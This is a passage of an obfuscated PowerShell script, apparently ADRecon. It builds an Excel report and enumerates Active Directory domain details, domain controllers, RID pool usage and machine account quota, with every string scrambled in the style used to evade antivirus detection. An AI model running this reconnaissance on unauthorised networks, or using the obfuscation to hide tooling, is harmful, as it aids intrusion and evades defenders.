TfGUf5OwB8f/gf/','eOSRcqvBX+','fM//AIOPgBJ/','ABCg0APC1Dzd4Ae7/iMIEaEN6lrDn/EJbEGpyv5QQ0qls9soOJFp+aJwqaM+BH/6+P/aAAwDAQACEQMRAAAQ7zzzzzzz/wD/AP','z','9kO5T6lqV','v8AdxXu4+Cf8Q2bePdL7eNunUH4J/xCa9u+d79','KSSTrTLm8yppK','ipxHFq','q','DQ19QUk9GSUxFAAEBAAACkGxjbXMEMAAAbW50clJHQiBYWVogB+IAAwAbAAUANwAOYWNzcEFQUEwAAAA','B6/n/hEfxRFkg85NSPikLWe','AD2AAAwJRYWVogAAAAAAAAb5QAADjuAAADkFhZWiAAAAAAAAAknQAAD4MAALa+WFlaIAAAAA','VkA','AAA0y1sY21zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','Dzd1/t+TX/aLjkWClFD1Hg1lKgRiODGKFEV1oGkm71p+0GqW2mMsnkkGropJB+LGKFEV1oGkm71p+0','vdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAA','0+f9+9n/wBqfjv/ABp+Ev8Aa34v/wBrXgr/AGnz/v8Awl/tb8X/AO1p2XKN3ut7DYqJqbS4ltZtqudsnjvp9hvVcnwy903CVXbwpe2ttZTGsu1bgZl72LRN/t9/c2jTH4bUnk+GXvYtE3+339zaNMfhtSeT4Ze6qt4N02y6s','/oItnX0sIjA','/Jf8AgEz/AB58uqnveZDnKiJFEfDKtIjTK5o+GzFtwBcE8ji81AkZB9ySk2hBPIWfi/8A0P8AusW0BlGPd/f/AMqPT7uNWPd/x/u/7Xld','t+w2q','qO+2aLHcO2x7Sb+Pft2F9BZ3v6','/9j/4AAQSkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAgESAAMAAAABAA','Bl7rrKRCYXN','2j3W4pyKeX','2WzVXWklcOF8tNGdoDjR1ZmtAkKGR','i5IKcT+aDEIAJ/F9SyEUGgQUkWLkgpxP5v+','F4dw9tlxp0b+9/a/tv5/58ljTr1c2lCENU','flIwPi','ApbcGFyYQAAAAAAAwAAAAJmZgAA8qcAAA1ZAAAT0AAACltjaHJtAAAAAAADAAAAAKPXAABUe','EAAIdpAAQAAAABAAAAJgAAAAAAA','P/AD/wKnmaoBooIKgvfeTw8W/lljjYE0YOWwgCijjT9T9yxgAg/wD/AP8A/wD/','vLYweGQdxtNomtbmCW3l/1FD+98Zf7Sty/wCMP2f/AGp+O/8AGntV5Ju','2','wAATM0','bUOp2Mh8yLHUIy2z8kAhghPyjinHx976E4yP2mI','14v/ANrXgc0svEG8JvkeEyf014v/ANrXbwPQWS942ML2vctquLzd/wDjLvHf+NPZ7OXbT','3K+g2YqNujmNntBcY4JE21','J4qyYPPLX50pb0xh','9oACAEBAAE/EP8A9P6uHOf3U76uX7rzzUI/5neXPN54/wCH/wChCDKAHlqdxZ8nuR6rm8UORxF9QjmPVVURhgv/ANb/AKs7xoQo4je71Tzi','eQb','z','4eHh4eHh4eHh4eHh4e','7f/wP/9oACAECEQE/EP8A7rwzk+pkCXCwYdPmR35LwpbQUI5KBt8GP7WoSHO','HL7ZafaLt5fbKIkmkYyUhxi5IHPlI','XcHk8cUy6Qun/EL4Dj/wAKobHbKCiRSfmkbjB4qoMBQeFqHm7wA9','70NT6M7VyuqPpz7XI/lMq984lpnVcCQDya/7Id1p5/1NfU','/wB','ad9s0WO4eCv8AafP+/wDCqVI3bxYpKt5hiXIpHh7','ZklHTCYNKEoxhw4idFN','VVMAAAAcAAAAHABzAFIARwBCAC','AebAAD9h///+6L///2jAA','4It+rv5w7GHJgfO','+JEq091M7YypEqdz7jufcROn3P6IlRtBpJv9g//aAAgBAhEBPwH9gEz+L83ICZgO04+XLL7LDs2i7Yy+2y+/HT34pmALRniykIi05ohBsW5','e5WEsa34U2+0','EBAQDBQQEBAUFBQYHDAgHBwcHDwsLCQwRDxISEQ8RERMWHBcTFBoVEREYIRgaHR0fHx8TFyIkIh4kHB4fHv/bAEMBBQUFBwYHDggIDh4UERQeHh4eHh4eHh','AAADAAAAAmZmAADypwAADVkAABPQAAAKW3BhcmEAAAAAAAMAAAACZmYAAPK','ZHe5J4ZMg2+o','9//2gAIAQMRAT8B/YDEeGPEbbEmA+6ndfFJ','4lqkhWFooNR/v+//xAAzEAEAAwACAgICAgMBAQAAAgsBEQAhMUFRYXGBkaGxwfDREOHxIDBAUGBwgJCgsMDQ4P/aAAgBAQABPyH/APXoQH','jTqjTqjTqjTqj','brJT8J67','d6P5xnUvWcdqu0U+r1xXkGze8RT7RPXF','BF9Q6LPWcn63m3LW','dHV2d','mQQOT192AsGoHUfx/w7q8Dr/RcwB8fzUGQdb7sQxlJsSzHFm/OECZli','KZRsO3ii+z/V28UX2f6px','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPbWAAEAA','r9HJ8Mu/k2mzt7u4lupvCl7a21lMay+Gpo','NJ4rfuw+P+/i56/5H/IfH/Iv+b/8Ag/fxf8X4f8Mf4rz/AMDw8HXTEcFloORd/T7pZHfaZmifl/yvg/8A2XlD2','TqjTqjTqjbVttW21bTqjbVtOqNtWnFj2dP3RuXfy','XXGsrK','AAAGKlAAC3kAAAGN5wYXJhAAAA')
        }
        ${B`y`TES} =   ( vARiabLE  DqIR4 -vA )::("{2}{0}{3}{1}{4}"-f 'romBas','4Strin','F','e6','g').Invoke(${bAse64`Ad`Re`cON})
        &("{3}{2}{1}{0}" -f'le','-Variab','ve','Remo') ("{0}{1}{3}{2}"-f'base64a','dre','on','c')

        ${Co`MP`AN`YlOGo} = -join(${rEP`oR`T`pATH},'\',("{2}{1}{0}{3}{4}"-f 'Rec','D','A','on_','Logo.jpg'))
		${P} = &("{0}{2}{1}"-f 'New-Ob','t','jec') ("{1}{2}{3}{0}" -f'am','IO','.Memor','yStre')(${B`Yt`es}, 0, ${byT`Es}."LEng`TH")
		${p}.("{0}{1}"-f'Wr','ite').Invoke(${BY`Tes}, 0, ${b`yt`es}."LEng`TH")
        &("{0}{1}{2}"-f 'Add-T','yp','e') -AssemblyName ("{3}{2}{0}{1}"-f'aw','ing','em.Dr','Syst')
		${PI`ctU`RE} =   (  Get-VarIabLe  ('n8tP'+'u') -vALu)::("{0}{2}{1}"-f'Fr','am','omStre').Invoke(${P}, ${Tr`Ue})
		${PIcTu`Re}.("{0}{1}"-f 'Sa','ve').Invoke(${C`OMp`AnYl`OgO})

        &("{3}{0}{1}{2}{4}" -f 'move','-Vari','abl','Re','e') ("{1}{0}"-f'es','byt')
        &("{2}{4}{0}{3}{1}" -f 'Varia','e','Re','bl','move-') ('p')
        &("{0}{3}{2}{1}"-f 'Remove-Vari','e','bl','a') ("{0}{1}{2}" -f 'p','ic','ture')

        ${linK`T`O`FILe} = ${F`Al`se}
        ${sAve`wIThd`OC`UMeNT} = ${TR`Ue}
        ${Le`Ft} = 0
        ${t`OP} = 0
        ${w`idth} = 150
        ${H`eiG`ht} = 50

        
        ${worK`sHE`eT}."sHap`eS".("{1}{2}{3}{0}"-f'e','Ad','d','Pictur').Invoke(${coMpA`Ny`LOGo}, ${liN`k`TOfilE}, ${S`A`VE`WIthd`oCumeNT}, ${Le`FT}, ${t`oP}, ${w`Id`Th}, ${heI`GHt}) | &("{2}{1}{0}" -f 'l','ut-Nul','O')

        &("{4}{3}{1}{2}{0}" -f'e','a','bl','-Vari','Remove') ("{2}{1}{3}{0}"-f 'e','kToF','Lin','il')
        &("{2}{1}{3}{4}{0}"-f 'able','ve','Remo','-Var','i') ("{0}{1}{2}{3}" -f'Sav','eWi','thD','ocument')
        &("{3}{0}{2}{4}{1}"-f 'ov','ble','e-Va','Rem','ria') ("{0}{1}" -f 'Le','ft')
        &("{3}{0}{1}{2}" -f'mov','e-Variab','le','Re') ("{1}{0}"-f 'p','To')
        &("{1}{0}{2}" -f 'emove-','R','Variable') ("{0}{1}"-f 'Wid','th')
        &("{4}{0}{3}{2}{1}" -f've-Vari','e','l','ab','Remo') ("{0}{1}"-f 'Hei','ght')

        If (&("{0}{2}{1}" -f'Test-P','th','a') -Path ${Comp`A`N`ylOGo})
        {
            &("{0}{3}{2}{1}" -f 'Remo','em','t','ve-I') ${C`Om`P`AnyLOgO}
        }
        &("{0}{1}{2}" -f 'R','emove-Varia','ble') ("{0}{2}{1}"-f 'Com','anyLogo','p')

        ${r`oW} = 5
        ${c`olu`mN} = 1
        ${W`orK`SheeT}."Ce`LLS".("{1}{0}"-f 'm','Ite').Invoke(${r`oW},${CO`L`Umn})= ("{1}{4}{2}{0}{3}{5}"-f 'o','Table ','f C','nten','o','ts')
        ${wo`RkS`hEEt}."cEl`ls".("{1}{0}"-f 'm','Ite').Invoke(${R`oW},${co`lU`MN})."S`TYLE" = ("{0}{1}{2}" -f 'Head','i','ng 2')
        ${R`oW}++

        For(${I}=2; ${i} -le ${WORK`BO`OK}."wORK`shE`ets"."co`UnT"; ${I}++)
        {
            ${W`O`RKboOK}."W`ORK`Sheets".("{0}{1}" -f 'I','tem').Invoke(1)."hyPe`RL`iNKs".("{0}{1}"-f'Ad','d').Invoke(${wORkb`o`OK}."wo`R`ks`HEeTs".("{0}{1}"-f'I','tem').Invoke(1)."c`ellS".("{0}{1}"-f 'Ite','m').Invoke(${R`oW},${Colu`mN}) , "" , "'$($workbook.Worksheets.Item($i).Name)'!A1", "", ${WO`RKB`oOk}."WOR`k`ShEEtS".("{0}{1}" -f 'Ite','m').Invoke(${i})."Na`me") | &("{1}{2}{0}"-f'll','Ou','t-Nu')
            ${R`Ow}++
        }

        ${r`Ow}++
		${w`orkbooK}."w`Or`K`SHEeTS".("{0}{1}"-f'I','tem').Invoke(1)."hy`PErl`iNks".("{1}{0}"-f'dd','A').Invoke(${w`oRkB`OOK}."WOR`Ks`hE`EtS".("{0}{1}"-f 'I','tem').Invoke(1)."c`Ells".("{1}{0}" -f'em','It').Invoke(${R`ow},1) , ("{3}{2}{0}{6}{4}{8}{9}{1}{7}{5}" -f '//g','on','s:','http','b.c','n','ithu','/ADReco','om/','adrec'), "" , "", ("{8}{5}{4}{0}{2}{3}{7}{6}{1}"-f'com/ad','con','re','c','.','thub','/ADRe','on','gi')) | &("{2}{1}{0}"-f't-Null','u','O')

        ${wO`RkSh`e`Et}."U`SE`DRAnge"."eNTiRec`OLu`mN".("{1}{0}" -f 'it','AutoF').Invoke() | &("{2}{1}{0}" -f'l','l','Out-Nu')

        ${eXc`el}."wi`NdOws".("{1}{0}" -f 'm','Ite').Invoke(1)."di`sPlAy`GR`id`LINES" = ${f`Al`Se}
        ${Exc`El}."SCR`e`Enup`Dati`NG" = ${tr`UE}
        ${A`DSta`T`FIL`enAME} = -join(${ExCE`lP`A`Th},'\',${doMaI`N`NAme},("{4}{2}{0}{1}{3}"-f'ort','.xl','n-Rep','sx','ADReco'))
        Try
        {
            
            ${eX`c`EL}."dIs`PL`AYale`Rts" = ${fA`LSe}
            ${wOrk`B`ook}.("{0}{1}"-f 'Sa','veAs').Invoke(${Ad`s`T`Atf`ileNAME})
            &("{2}{3}{1}{0}"-f 'put','Out','Writ','e-') ('['+'+] '+'Exc'+'elshe'+'et '+'Sa'+'ve'+'d '+'t'+'o: '+"$ADStatFileName")
        }
        Catch
        {
            &("{1}{0}{2}"-f'te','Wri','-Error') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${e`xCeL}.("{0}{1}" -f 'Qui','t').Invoke()
        &("{1}{6}{3}{5}{4}{2}{0}" -f 'elease','Get-AD','R','celComO','j','b','REx') -ComObjtoRelease ${w`o`RkSHEEt} -Final ${T`RUe}
        &("{3}{0}{1}{4}{2}"-f'-Var','i','e','Remove','abl') ("{0}{1}{2}" -f'workshe','e','t')
        &("{2}{6}{0}{3}{5}{4}{1}" -f 'O','e','Get-A','bjRele','s','a','DRExcelCom') -ComObjtoRelease ${W`ork`BOok} -Final ${t`RUE}
        &("{3}{4}{2}{1}{0}"-f 'ble','ia','ove-Var','R','em') -Name ("{1}{0}{2}"-f 'oo','workb','k') -Scope ("{1}{0}{2}"-f'a','Glob','l')
        &("{4}{2}{3}{1}{0}"-f'bjRelease','mO','-ADRExcel','Co','Get') -ComObjtoRelease ${e`XCEl} -Final ${Tr`Ue}
        &("{1}{2}{0}" -f'le','Remove-Var','iab') -Name ("{1}{0}"-f'l','exce') -Scope ("{1}{0}"-f 'lobal','G')
    }
}

Function get-aDrD`Oma`IN
{

    param(
        [Parameter(mANDAtoRY = ${tR`Ue})]
        [string] ${Me`T`hOd},

        [Parameter(maNDAtoRY = ${FaL`se})]
        [DirectoryServices.DirectoryEntry] ${obJDo`m`Ain},

        [Parameter(maNdATOrY = ${f`AL`SE})]
        [DirectoryServices.DirectoryEntry] ${obJd`O`mAInrO`o`TDSe},

        [Parameter(MAnDatORY = ${f`A`LSe})]
        [string] ${DomAinc`ONtr`o`ller},

        [Parameter(MAndAtORy = ${F`ALSE})]
        [Management.Automation.PSCredential] ${creDEN`T`i`AL} =   (item  ('vA'+'RiAb'+'LE:C'+'Lf0N')  ).valuE::"EMp`TY"
    )

    If (${mE`TH`Od} -eq ("{0}{1}" -f 'AD','WS'))
    {
        Try
        {
            ${Ad`Do`Main} = &("{0}{2}{1}{3}"-f 'Get-A','omai','DD','n')
        }
        Catch
        {
            &("{0}{2}{1}{3}" -f 'Wri','r','te-Wa','ning') ("{3}{6}{12}{0}{5}{11}{2}{9}{8}{4}{7}{10}{1}"-f 'i','xt','r','[','mai','n','Get-','n Co','ting Do','or get','nte','] Er','ADRDoma')
            &("{0}{2}{1}"-f 'Wr','erbose','ite-V') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`ll}
        }
        If (${AD`d`OM`AiN})
        {
            ${Do`mAi`NObj} = @()

            
            ${F`LaD} = @{
	            0 = ("{0}{3}{1}{2}" -f 'Window','200','0','s');
	            1 = ("{1}{4}{0}{3}{2}"-f'2003/','W','nterim','I','indows');
	            2 = ("{3}{2}{0}{1}"-f'ws','2003','ndo','Wi');
	            3 = ("{1}{0}{2}" -f'dows2','Win','008');
	            4 = ("{2}{0}{1}" -f '20','08R2','Windows');
	            5 = ("{1}{2}{3}{0}"-f '2','Win','do','ws201');
	            6 = ("{0}{2}{1}"-f 'Windo','012R2','ws2');
	            7 = ("{1}{2}{0}" -f'16','W','indows20')
            }
            ${DO`maiNmO`De} = ${f`laD}[  (  GEt-VARIABLe ("A"+"scoU"+"G")).VALUe::("{2}{0}{1}" -f'Int','32','To').Invoke(${AddO`Ma`in}."DO`mAinmo`De")] + ("{2}{1}{0}" -f'n','mai','Do')
            &("{1}{0}{3}{2}"-f 'V','Remove-','riable','a') ("{1}{0}"-f'LAD','F')
            If (-Not ${DOma`In`Mode})
            {
                ${DomaIn`M`OdE} = ${A`d`Domain}."DO`MaiNMo`dE"
            }

            ${oB`jvALU`eS} = @(("{1}{0}" -f'e','Nam'), ${Ad`d`O`maIN}."dns`RO`OT", ("{1}{2}{0}"-f'BIOS','Ne','t'), ${aDdOM`A`IN}."NetbioSn`A`mE", ("{2}{0}{1}" -f'u','nctional Level','F'), ${DoM`AIN`mO`de}, ("{0}{1}{2}"-f'Do','m','ainSID'), ${a`Dd`oMAiN}."dO`mA`inSId"."Val`UE")

            For (${I} = 0; ${I} -lt $(${ob`jva`lueS}."c`OUNt"); ${i}++)
            {
                ${O`Bj} = &("{2}{0}{1}" -f'ew-O','bject','N') ("{0}{2}{1}"-f'PSOb','ect','j')
                ${o`Bj} | &("{0}{2}{1}" -f'Add-Me','er','mb') -MemberType ("{0}{3}{1}{2}"-f 'Note','pe','rty','Pro') -Name ("{0}{1}"-f 'Categor','y') -Value ${oBjvA`l`UEs}[${i}]
                ${o`BJ} | &("{1}{2}{3}{0}"-f'mber','A','dd-','Me') -MemberType ("{2}{3}{0}{1}"-f'ePro','perty','N','ot') -Name ("{1}{0}" -f'e','Valu') -Value ${ob`J`V`ALuEs}[${i}+1]
                ${i}++
                ${DoMAi`N`oBJ} += ${O`BJ}
            }
            &("{4}{1}{0}{3}{2}"-f'-V','move','ble','aria','Re') ("{2}{1}{0}"-f 'ode','ainM','Dom')

            For(${i}=0; ${i} -lt ${A`Ddo`MaIN}."r`Eplica`d`irEC`TORy`Ser`Ve`RS"."C`ouNt"; ${i}++)
            {
                ${o`Bj} = &("{2}{0}{1}" -f'w-O','bject','Ne') ("{1}{0}{2}" -f'b','PSO','ject')
                ${o`Bj} | &("{0}{2}{1}"-f'Add-Memb','r','e') -MemberType ("{3}{2}{0}{1}" -f'teProper','ty','o','N') -Name ("{1}{0}" -f 'gory','Cate') -Value ("{4}{1}{0}{3}{2}" -f 'in C','ma','ler','ontrol','Do')
                ${O`BJ} | &("{1}{0}{2}{3}" -f'd','A','d-Mem','ber') -MemberType ("{0}{2}{1}" -f 'Not','perty','ePro') -Name ("{0}{1}"-f'Val','ue') -Value ${adDo`mAin}."reP`l`icadIReCt`o`RY`SeRVE`RS"[${i}]
                ${DOmAi`N`Obj} += ${O`Bj}
            }
            For(${I}=0; ${i} -lt ${a`dd`OMAIN}."rEAd`O`NlyRePlICAD`I`RecTo`RYS`e`RV`eRS"."C`OunT"; ${I}++)
            {
                ${o`Bj} = &("{1}{0}{2}"-f'O','New-','bject') ("{1}{0}"-f 't','PSObjec')
                ${o`Bj} | &("{1}{0}{2}{3}" -f'e','Add-M','mbe','r') -MemberType ("{1}{3}{2}{0}" -f'y','NoteProp','rt','e') -Name ("{1}{2}{0}" -f'ry','Categ','o') -Value ("{8}{6}{4}{7}{5}{1}{3}{2}{0}"-f'er','C','roll','ont','ly D','main ','ead On','o','R')
                ${o`Bj} | &("{2}{1}{0}" -f 'ber','-Mem','Add') -MemberType ("{0}{1}{2}" -f'NotePr','op','erty') -Name ("{0}{1}" -f'Val','ue') -Value ${aD`d`OmAIn}."ReA`DoNL`yr`ePLIcadIRec`ToR`Y`s`Er`VerS"[${I}]
                ${Do`MAi`NOBJ} += ${O`BJ}
            }

            Try
            {
                ${aDf`o`RE`st} = &("{1}{3}{0}{2}"-f 'F','Get-A','orest','D') ${Ad`DomA`in}."foRe`St"
            }
            Catch
            {
                &("{3}{1}{2}{0}"-f'bose','i','te-Ver','Wr') ("{5}{3}{6}{7}{4}{10}{8}{0}{2}{1}{9}"-f 'g Fore','t Conte','s','R','] Erro','[Get-AD','D','omain','n','xt','r getti')
                &("{3}{0}{2}{1}" -f'-Ve','bose','r','Write') "[EXCEPTION] $($_.Exception.Message) "
            }

            If (-Not ${A`DFor`EsT})
            {
                Try
                {
                    ${Ad`FO`ResT} = &("{2}{1}{0}" -f 'est','r','Get-ADFo') -Server ${do`Main`COnTrO`llEr}
                }
                Catch
                {
                    &("{1}{0}{2}{3}"-f'War','Write-','n','ing') ("{1}{6}{2}{0}{4}{7}{3}{5}" -f 'etting ','[Get-A',' Error g','Con','Forest','text','DRDomain]',' ')
                    &("{1}{2}{0}{3}"-f 'te-Verbo','W','ri','se') "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            If (${A`dFOR`EsT})
            {
                ${do`MaI`NCre`A`TIOn} = &("{2}{3}{1}{0}"-f't','bjec','Ge','t-ADO') -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.Name)))" -Properties ("{0}{2}{1}" -f 'whenC','d','reate')
                If (-Not ${DOma`I`Nc`REA`TiOn})
                {
                    ${dOMa`iNcr`EaTIOn} = &("{3}{1}{2}{0}" -f't','je','c','Get-ADOb') -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.NetBIOSName)))" -Properties ("{2}{0}{1}{3}"-f'enCre','at','wh','ed')
                }
                &("{0}{3}{1}{2}"-f'Rem','e-Vari','able','ov') ("{0}{1}" -f'ADFo','rest')
            }
            
            Try
            {
                ${rI`DmAn`AGER} = &("{0}{1}{2}" -f 'Ge','t-AD','Object') -Identity "CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) " -Properties ("{1}{0}{4}{2}{3}" -f'vailab','rIDA','oo','l','leP')
                ${RI`dp`ROpERty} = ${R`Id`MaNAGeR}."RiDAVaIla`BleP`o`oL"
                [int32] ${toT`ALSi`ds} = $(${R`Idp`R`OPerTy}) / ( (vARIaBle  ("U"+"XZO") -vaLue)::("{0}{1}"-f 'P','ow').Invoke(2,32))
                [int64] ${T`em`p`64VAL} = ${To`TaLS`IDS} * ( $UxZO::("{1}{0}" -f 'ow','P').Invoke(2,32))
                ${rI`DS`IsSuEd} = [int32]($(${Rid`PRo`Pe`RtY}) - ${t`eM`P`64Val})
                ${riD`srEma`IN`inG} = ${toTAL`s`I`ds} - ${r`IdsI`Ss`UEd}
                &("{0}{2}{3}{1}" -f'Remov','e','e-Varia','bl') ("{2}{0}{1}"-f'IDM','anager','R')
                &("{0}{1}{4}{3}{2}" -f'Remo','ve-','e','riabl','Va') ("{1}{0}{2}" -f 'pert','RIDpro','y')
                &("{0}{2}{1}" -f'Remove-Vari','e','abl') ("{2}{1}{0}" -f 'DS','lSI','tota')
                &("{1}{2}{0}" -f'iable','Re','move-Var') ("{0}{1}{2}"-f 'te','mp64va','l')
            }
            Catch
            {
                &("{3}{1}{0}{2}"-f 'e','it','-Warning','Wr') "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) "
                &("{4}{2}{1}{0}{3}"-f '-V','ite','r','erbose','W') "[EXCEPTION] $($_.Exception.Message) "
            }
            If (${DO`M`AI`NCRe`ATIoN})
            {
                ${o`Bj} = &("{1}{0}{2}"-f'-Ob','New','ject') ("{1}{0}{2}"-f'SObjec','P','t')
                ${O`BJ} | &("{2}{1}{0}"-f 'r','embe','Add-M') -MemberType ("{1}{0}{2}{3}"-f 'P','Note','ropert','y') -Name ("{0}{1}" -f 'Cate','gory') -Value ("{0}{3}{1}{2}{4}"-f'Crea','on ','D','ti','ate')
                ${o`BJ} | &("{0}{2}{1}"-f 'Ad','ember','d-M') -MemberType ("{1}{3}{0}{2}" -f 'per','No','ty','tePro') -Name ("{1}{0}"-f'ue','Val') -Value ${dOmaIn`CRe`AtI`ON}."Wh`e`NCReATEd"
                ${DOma`ino`BJ} += ${O`BJ}
                &("{3}{2}{1}{0}" -f'ble','e-Varia','mov','Re') ("{0}{3}{1}{2}{4}" -f'D','C','r','omain','eation')
            }

            ${o`BJ} = &("{1}{2}{0}" -f'Object','New','-') ("{1}{0}" -f'ject','PSOb')
            ${o`Bj} | &("{0}{1}{2}" -f'Add-Me','mb','er') -MemberType ("{0}{2}{3}{1}"-f 'Note','operty','P','r') -Name ("{0}{1}{2}"-f'Cat','egor','y') -Value ("{3}{0}{2}{1}{4}"-f 'DS','ntQu','-MachineAccou','ms-','ota')
            ${O`BJ} | &("{1}{0}{2}"-f 'd','Ad','-Member') -MemberType ("{0}{1}{2}{3}" -f 'No','teP','ropert','y') -Name ("{0}{1}"-f 'Va','lue') -Value $((&("{0}{1}{2}"-f'Get-A','DObje','ct') -Identity (${add`Oma`In}."dIst`ing`Uis`hedN`Ame") -Properties ("{2}{4}{3}{1}{0}"-f 'ountQuota','c','ms-','hineAc','DS-Mac')).'ms-DS-MachineAccountQuota')
            ${Doma`i`NOBj} += ${o`BJ}

            If (${r`ID`SiS`SUED})
            {
                ${O`Bj} = &("{1}{0}{2}"-f'w-O','Ne','bject') ("{1}{2}{0}"-f 'ct','PSOb','je')
                ${O`BJ} | &("{2}{3}{0}{1}" -f'Me','mber','A','dd-') -MemberType ("{1}{0}{3}{2}" -f 'r','NoteP','perty','o') -Name ("{1}{2}{0}" -f 'ory','Cate','g') -Value ("{3}{2}{0}{1}" -f 'Ds Is','sued','I','R')
                ${o`Bj} | &("{1}{2}{0}" -f 'mber','A','dd-Me') -MemberType ("{2}{3}{0}{1}"-f 'op','erty','Note','Pr') -Name ("{1}{0}"-f'alue','V') -Value ${R`Idsis`SuEd}
                ${D`oMA`iNO`Bj} += ${o`BJ}
                &("{1}{0}{2}"-f'ov','Rem','e-Variable') ("{2}{0}{1}"-f 'ssue','d','RIDsI')
            }
            If (${RiDS`REmA`InI`Ng})
            {
                ${o`BJ} = &("{1}{2}{0}"-f'ect','N','ew-Obj') ("{0}{1}"-f'PSObjec','t')
                ${O`Bj} | &("{0}{1}{2}"-f'Ad','d','-Member') -MemberType ("{2}{1}{0}" -f 'operty','Pr','Note') -Name ("{0}{2}{1}"-f'C','egory','at') -Value ("{2}{0}{1}{3}{4}"-f's',' Re','RID','m','aining')
                ${o`BJ} | &("{0}{1}{2}"-f 'Add-M','emb','er') -MemberType ("{2}{1}{0}"-f 'ty','teProper','No') -Name ("{1}{0}"-f 'ue','Val') -Value ${r`Idsr`EmA`iNINg}
                ${doMAI`N`OBj} += ${O`BJ}
                &("{1}{2}{0}{3}"-f'ariabl','Rem','ove-V','e') ("{3}{4}{1}{2}{0}"-f 'ing','em','ain','RIDs','R')
            }
        }
    }

    If (${MeT`H`od} -eq ("{0}{1}"-f'L','DAP'))
    {
        If (${CRED`eN`TIaL} -ne  (  gEt-vAriAblE  clf0n).ValUe::"em`pTy")
        {
            ${d`omaiN`FqdN} = &("{0}{2}{3}{1}" -f 'Get','QDN','-DN','toF')(${ob`jDo`maiN}."DiSTin`guish`E`Dn`AMe")
            ${DOM`AIn`COn`Text} = &("{0}{1}{2}" -f 'New-Ob','jec','t') ("{9}{13}{7}{4}{10}{14}{5}{2}{0}{11}{12}{1}{3}{6}{8}" -f 'tory','Co','ctiveDirec','nt','Ser','A','ex','ry','t','Sys','vi','.Director','y','tem.Directo','ces.')(("{0}{1}"-f 'Dom','ain'),$(${D`Om`AINfQdN}),$(${C`REdEN`Ti`AL}."UsERN`A`me"),$(${cRede`NtI`AL}.("{4}{1}{5}{2}{3}{0}" -f 'ial','tNetwo','d','ent','Ge','rkCre').Invoke()."p`AsSwO`RD"))
            Try
            {
                ${ADD`o`MA`in} =  ( dIR  ("vaRiabLE:"+"uX5"+"M")).VALue::("{0}{1}{2}"-f'GetD','om','ain').Invoke(${doma`In`C`ONTExt})
            }
            Catch
            {
                &("{4}{1}{3}{0}{2}"-f 'arni','ri','ng','te-W','W') ("{0}{2}{5}{7}{6}{8}{1}{4}{3}{9}" -f'[G','mai','et-ADR','n','n Co','Dom','or g','ain] Err','etting Do','text')
                &("{3}{2}{0}{1}" -f'er','bose','V','Write-') "[EXCEPTION] $($_.Exception.Message) "
                Return ${N`Ull}
            }
            &("{2}{1}{4}{3}{0}"-f'iable','ov','Rem','-Var','e') ("{2}{0}{1}{3}" -f 't','e','DomainCon','xt')
            
            Try
            {
                ${seA`R`C`HpATH} = ('CN'+'='+'RID '+"Manager$,CN=System")
                ${oBJsE`AR`c`hpAtH} = &("{1}{0}{2}"-f'ew-','N','Object') ("{4}{5}{2}{0}{3}{6}{1}"-f 'i','ctoryEntry','em.D','rectoryServices.','S','yst','Dire') "LDAP://$($DomainController)/$SearchPath,$($objDomain.distinguishedName)", ${CREdE`Nt`iAL}."uS`ERna`me",${CReDe`N`TIal}.("{1}{3}{0}{4}{2}"-f'N','G','ential','et','etworkCred').Invoke()."PAss`worD"
                ${o`BjsEA`RC`hERpa`TH} = &("{3}{1}{2}{0}"-f 'ject','w-O','b','Ne') ("{5}{4}{6}{2}{3}{8}{1}{0}{7}"-f'ces.Director','Servi','tem','.D','y','S','s','ySearcher','irectory') ${OBjSE`A`RCHPa`Th}
                ${OBjS`eaRc`He`RPaTH}."proPER`TIes`TOLoad".("{0}{2}{1}" -f'AddR','ge','an').Invoke((("{0}{1}{2}{3}"-f'ri','dava','ilabl','epool')))
                ${OBJ`sEARcHER`R`es`U`lt} = ${oBjSEaR`cHE`RpA`Th}.("{0}{1}"-f'FindA','ll').Invoke()
                ${ri`DpRop`er`Ty} = ${OB`JsEAR`Ch`ERR`eSUlT}."PRoP`e`RTIEs"."r`idaVaIL`A`BLeP`oOl"
                [int32] ${T`o`T`AlSiDs} = $(${ridPR`oPE`RTY}) / ( $UxzO::("{0}{1}"-f 'Po','w').Invoke(2,32))
                [int64] ${TE`mp6`4Val} = ${T`OtaLSI`DS} * ( (vARiAble  UXzo  ).VaLuE::("{0}{1}" -f 'P','ow').Invoke(2,32))
                ${rIdsISs`U`ED} = [int32]($(${RIdpRo`pEr`Ty}) - ${tE`Mp64`V`AL})
                ${ri`DSREmA`i`NINg} = ${T`oT`AlsIDS} - ${ri`d`SisSU`Ed}
                &("{3}{4}{1}{0}{2}" -f'bl','aria','e','Rem','ove-V') ("{1}{0}{2}"-f 'archP','Se','ath')
                ${obJs`E`ARCHPaTh}.("{2}{0}{1}"-f'ispo','se','D').Invoke()
                ${obJS`EA`R`chErpAtH}.("{0}{1}"-f 'Dispo','se').Invoke()
                ${OBjs`Ear`CHe`RRes`Ult}.("{0}{1}{2}" -f'Dispo','s','e').Invoke()
                &("{1}{3}{0}{2}"-f 'Varia','Remov','ble','e-') ("{1}{2}{0}" -f'perty','RI','Dpro')
                &("{0}{1}{3}{2}" -f 'Rem','ov','able','e-Vari') ("{2}{1}{0}"-f 'alSIDS','t','to')
                &("{0}{2}{1}" -f'Remove-V','riable','a') ("{1}{2}{0}"-f '4val','temp','6')
            }
            Catch
            {
                &("{3}{0}{1}{2}" -f 'e-','War','ning','Writ') "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                &("{3}{1}{0}{2}"-f'Verb','e-','ose','Writ') "[EXCEPTION] $($_.Exception.Message) "
            }
            Try
            {
